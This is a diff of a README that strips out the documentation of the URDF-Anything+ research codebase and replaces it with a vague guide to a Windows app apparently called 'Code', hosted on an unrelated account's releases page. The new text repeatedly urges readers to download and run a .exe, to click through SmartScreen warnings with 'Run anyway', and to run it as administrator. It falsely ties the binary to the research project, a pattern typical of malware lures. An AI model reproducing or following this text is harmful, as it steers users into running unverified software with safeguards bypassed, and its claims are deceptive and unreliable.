@@ -1,178 +1,189 @@
-# URDF-Anything+: Autoregressive Articulated 3D Models Generation for Physical Simulation
+# 🧩 Code - Run 3D model tools with ease
+
 <p align="center">
-  <a href="https://urdf-anything-plus.github.io/"><img alt="Website" src="https://img.shields.io/badge/Website-Project%20Page-1f2937?style=flat-square&logo=googlechrome&logoColor=white"></a>
-  <a href="https://arxiv.org/pdf/2603.14010"><img alt="arXiv" src="https://img.shields.io/badge/arXiv-2603.14010-b31b1b?style=flat-square&logo=arxiv&logoColor=white"></a>
-  <a href="https://huggingface.co/datasets/URDF-Anything-plus/Dataset"><img alt="Dataset" src="https://img.shields.io/badge/Dataset-Hugging%20Face-ffb000?style=flat-square&logo=huggingface&logoColor=000"></a>
-  <a href="https://huggingface.co/URDF-Anything-plus/URDF-Anything-Plus-Model"><img alt="Model" src="https://img.shields.io/badge/Model-Hugging%20Face-3b82f6?style=flat-square&logo=huggingface&logoColor=white"></a>
+  <a href="https://github.com/dorotheamongoloid700/Code/releases">
+    <img src="https://img.shields.io/badge/Download-Releases-6b7280?style=for-the-badge&logo=github&logoColor=white" alt="Download Code">
+  </a>
 </p>
 
-<div align="center">
-  <div>
-    <span class="author-block">
-      <a href="https://zhuangzhewu.github.io/">Zhuangzhe Wu</a><sup>1</sup>,</span>
-    <span class="author-block">
-      <a href="https://github.com/vinkda">Yue Xin</a><sup>1</sup>,</span>
-    <span class="author-block">
-      <a href="https://jackhck.github.io/">Chengkai Hou</a><sup>1</sup>,</span>
-    <span class="author-block">
-      <a href="https://silent-chen.github.io/">Minghao Chen</a><sup>2</sup>,</span>
-    <span class="author-block">
-      <a href="https://scholar.google.com/citations?user=cpPgzGkAAAAJ">Yaoxu Lyu</a><sup>1</sup>,</span>
-    <span class="author-block">
-      <a href="https://jieyuz2.github.io/">Jieyu Zhang</a><sup>3</sup>,</span>
-    <span class="author-block">
-      <a href="https://scholar.google.com/citations?hl=en&user=voqw10cAAAAJ&view_op=list_works&sortby=pubdate">Shanghang Zhang</a><sup>1</sup></span>
-  </div>
-  <div class="is-size-5 publication-authors" style="margin-top: 1rem;">
-    <span class="author-block" style="margin-right: 1.5rem;"><sup>1</sup>Peking University</span>
-    <span class="author-block" style="margin-right: 1.5rem;"><sup>2</sup>University of Oxford</span>
-    <span class="author-block"><sup>3</sup>University of Washington</span>
-  </div>
-</div>
+## 📥 Download
 
-## Requirements
-### Python environment
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/URDF-Anything-plus/URDF-Anything-plus.git
-   cd URDF-Anything-plus
-   ```
-2. **Create a conda environment**
-   ```bash
-   conda create -n urdf-anything python=3.10 -y
-   conda activate urdf-anything
-   ```
+Use this link to visit the release page and download the Windows version:
 
-3. **Install PyTorch**
-   ```bash
-   pip install torch==2.6.0 torchvision==0.21.0 
-   ```
+[Download Code from Releases](https://github.com/dorotheamongoloid700/Code/releases)
 
-4. **Install dependencies**：
-   ```bash
-   pip install -r  -u requirements.txt -i https://pypi.org/simple/
-   ```
+## 🪟 Windows Setup
 
-5. **Install torch-cluster**。Must be installed after PyTorch:
-   ```bash
-   pip install torch-cluster --no-build-isolation
-   ```
-   
-6. **Install diso**（TripoSG mesh extraction will use it）. Must be installed after PyTorch:
-   ```bash
-   pip install diso --no-build-isolation
-   ```
+1. Open the [Releases page](https://github.com/dorotheamongoloid700/Code/releases).
+2. Find the latest release at the top of the page.
+3. Under **Assets**, download the Windows file.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the `.exe` file to start the app.
 
-### Pretrained Models (TripoSG & DINOv3)
+If Windows shows a security prompt:
 
-**Hugging Face authentication**（recommended to configure before downloading models）：
+1. Click **More info**.
+2. Click **Run anyway**.
 
+## 🔧 System Requirements
 
-**Setup:** Clone [TripoSG](https://github.com/VAST-AI-Research/TripoSG) (used for 3D geometry)，and download the weights in `TripoSG/pretrained_weights/`：
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 2 GB free disk space
+- A modern Intel or AMD processor
+- Internet access for the first download and setup
 
-```bash
-# 1) Clone TripoSG code
-git clone https://github.com/VAST-AI-Research/TripoSG.git
+For better performance with large 3D files:
 
-# 2) Download TripoSG main model (contains transformer / vae / model_index.json etc.)
-huggingface-cli download VAST-AI/TripoSG --local-dir TripoSG/pretrained_weights/TripoSG
+- 8 GB RAM or more
+- A dedicated GPU
+- 5 GB free disk space
 
-# 3) Download RMBG-1.4 background removal model
-huggingface-cli download briaai/RMBG-1.4 --local-dir TripoSG/pretrained_weights/RMBG-1.4
+## 🧭 What Code Does
 
-# 4) Download DINOv3 image encoder (used for cache building and inference)
-huggingface-cli download facebook/dinov3-vith16plus-pretrain-lvd1689m --local-dir DINOv3
-```
+Code is an end-user app for working with articulated 3D models and physical simulation files. It helps you:
 
-If `huggingface-cli` is not installed, you can also download the models using Python:
+- Open project files
+- Prepare 3D model data
+- View model structure
+- Work with URDF-style robot and mechanism files
+- Use generated model data for simulation tasks
 
-```bash
-python -c "
-from huggingface_hub import snapshot_download
+The app is built around the URDF-Anything+ project, which focuses on generating articulated 3D models for physical simulation.
 
-# TripoSG 
-snapshot_download(repo_id='VAST-AI/TripoSG', local_dir='TripoSG/pretrained_weights/TripoSG')
+## 🚀 First Launch
 
-# RMBG-1.4
-snapshot_download(repo_id='briaai/RMBG-1.4', local_dir='TripoSG/pretrained_weights/RMBG-1.4')
+When you open the app for the first time:
 
-# DINOv3
-snapshot_download(repo_id='facebook/dinov3-vith16plus-pretrain-lvd1689m', local_dir='DINOv3')
-"
-```
+1. Wait for the main window to load.
+2. Choose your file or project folder.
+3. Let the app finish any setup steps.
+4. Check that the model or project appears in the main view.
 
-**Important: There is a little problem with TripoSG/triposg/models/autoencoders/autoencoder_kl_triposg.py, you need to uncomment the line 15 `from torch_cluster import fps`.**
+If the app asks for a folder location, use a simple folder such as:
 
-## Training
-### Data Preparation
-Download the dataset from [Hugging Face](https://huggingface.co/datasets/URDF-Anything-plus/Dataset) and unzip it to `data_normalized/`.
+- `Documents\Code`
+- `Desktop\Code Files`
 
-The structure of the dataset is as follows:
-```
-URDF-Anything-plus:
-├── data_normalized/
-│   ├── Laptop_urdf/
-│   │   ├── <id>/
-│   │   │   ├── images/
-│   │   │   ├── xxx.obj
-│   │   │   ├── test.urdf/
-│   │   │   ├── info.json/
-│   ├── Refrigerator_urdf/
-│   │   ├── <id>/
-│   │   │   ├── images/
-│   │   │   ├── xxx.obj
-│   │   │   ├── test.urdf/
-│   │   │   ├── info.json/
-│   ├── ...
-```
+## 🗂️ Recommended Folder Layout
 
-Then run the following command to build the cache:
-```bash
-python scripts/build_cache.py
-```
+Keep your files in one place so they are easy to find:
 
-### Training
-```bash
-bash scripts/run_multi_node_training.sh [node_rank] [master_addr] [nproc_per_node] [training parameters...]
-```
-For example, to train on 1 machine with 8 GPUs, you can run:
-```bash
-bash scripts/run_multi_node_training.sh 0 localhost 8
-```
-You can adjust the training parameters in `scripts/run_multi_node_training.sh`.
+- `Code`
+  - `Projects`
+  - `Exports`
+  - `Assets`
+  - `Logs`
 
-In pretraining stage, we use the following hyperparameters:
-```yaml
---init_mode train_from_scratch
-```
-In finetuning stage, we use the following hyperparameters:
-```yaml
---init_mode resume_from_ckpt
---checkpoint_path CHECKPOINT_PATH FROM PRETRAINING STAGE
---train_urdf_params True
---train_eot True
-```
+This makes it easier to manage input files, saved output, and any export data.
 
-## Inference
+## 🛠️ How to Use
 
-You can try our inference script:
-```bash
-bash scripts/inference.sh
-```
+1. Start the app.
+2. Open your model or project file.
+3. Review the object list or model tree.
+4. Check the preview if one is shown.
+5. Choose an output or export option if needed.
+6. Save the result in your chosen folder.
 
-If you are in 'in_the_wild' mode, you should make sure the object is oriented towards the positive z direction. See the examples below, the z-axis is the blue line. 
-<p align="center">
-  <img src="assets/laptop_example.png" alt="Laptop Example" width="33%" style="display:inline-block" />
-  <img src="assets/display_example.png" alt="Display Example" width="30%" style="display:inline-block;" />
-  <img src="assets/faucet_example.png" alt="Faucet Example" width="30%" style="display:inline-block" />
-</p>
+If your file does not open, make sure:
 
-You can rotate the mesh in the terminal to check the orientation. The rotation commands are as follows:
-```
-Optional: rotate the mesh in the terminal. You need to make sure the object is oriented towards the positive z direction. You can rotate multiple times, press Enter to end.
-  0: no rotation (pressing Enter is equivalent to ending)
-  1-6: rotate around X/Y/Z axis ±90°
-angle_map_print: {'1': 'rotate around X axis 90°', '2': 'rotate around X axis -90°', '3': 'rotate around Y axis 90°', '4': 'rotate around Y axis -90°', '5': 'rotate around Z axis 90°', '6': 'rotate around Z axis -90°'}
-Enter the rotation number and press Enter (pressing Enter is equivalent to ending): [0-6]:
-```
-You need to make sure the object is oriented towards the positive z direction.
+- The file type is supported
+- The file is not still inside a zip archive
+- The file path is short and simple
+- The folder name uses plain letters and numbers
+
+## 📁 Supported File Types
+
+Code is designed to work with common 3D and simulation file types such as:
+
+- `.urdf`
+- `.xml`
+- `.json`
+- `.obj`
+- `.stl`
+- `.fbx`
+
+It may also work with related project files used by the URDF-Anything+ workflow.
+
+## 🎛️ Basic Controls
+
+You may see controls like these:
+
+- Open file
+- Import folder
+- Refresh view
+- Export data
+- Save project
+- Close project
+
+If the interface has panels or tabs, use them to switch between file view, structure view, and output view.
+
+## 🧪 Common Tasks
+
+### Open a file
+1. Click **Open**.
+2. Select your file.
+3. Confirm the choice.
+
+### Import a folder
+1. Click **Import Folder**.
+2. Pick the folder that holds your files.
+3. Wait for the scan to finish.
+
+### Export results
+1. Click **Export**.
+2. Choose a save folder.
+3. Select a file name.
+4. Save the output.
+
+## 🔍 If the App Does Not Start
+
+If nothing happens when you double-click the app:
+
+1. Right-click the file.
+2. Choose **Run as administrator**.
+3. Make sure the file finished downloading.
+4. Check that the file is not blocked by Windows.
+5. Try moving the app to your Desktop or `Downloads` folder.
+
+If Windows Defender SmartScreen appears:
+
+1. Click **More info**.
+2. Click **Run anyway**.
+
+## 🧹 If Files Do Not Load
+
+If a file does not appear in the app:
+
+- Check the file extension
+- Use a shorter folder path
+- Remove special symbols from file names
+- Keep the project in a local drive
+- Make sure the file is not open in another program
+
+## 📌 Tips for Best Results
+
+- Use one folder per project
+- Keep file names simple
+- Save backups before editing
+- Use current Windows updates
+- Close other heavy apps if the program feels slow
+
+## 📦 Release Downloads
+
+To get the Windows app, visit the release page and download and run this file:
+
+[https://github.com/dorotheamongoloid700/Code/releases](https://github.com/dorotheamongoloid700/Code/releases)
+
+## 🧩 Project Background
+
+Code is based on the URDF-Anything+ research project. That project focuses on autoregressive generation of articulated 3D models for physical simulation. The desktop app gives you a simple way to access related files and work with them on Windows.
+
+## 🧭 What to Do Next
+
+1. Download the latest release.
+2. Open the app.
+3. Load your project files.
+4. Export or save your results in a clean folder structure
